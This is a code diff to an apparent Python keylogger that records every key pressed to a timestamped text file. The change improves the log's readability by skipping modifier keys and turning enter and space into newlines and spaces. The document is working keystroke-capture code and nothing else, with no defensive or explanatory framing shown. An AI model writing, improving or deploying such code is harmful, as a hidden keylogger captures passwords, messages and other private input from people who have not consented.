@@ -12,5 +12,12 @@ path = now + '.txt'
 with open(path, 'w') as file:
     while True:
         key = keyboard.read_event(suppress=False)
-        if(key.event_type == 'down'):
-            file.write(key.name)
+        if(str(key.name) in ['shift', 'right shift', 'ctrl']):
+            continue
+        elif(key.event_type == 'down'):
+            if(str(key.name) == 'enter'):
+                file.write('\n')
+            elif(str(key.name) == 'space'):
+                file.write(' ')
+            else:
+                file.write(key.name)
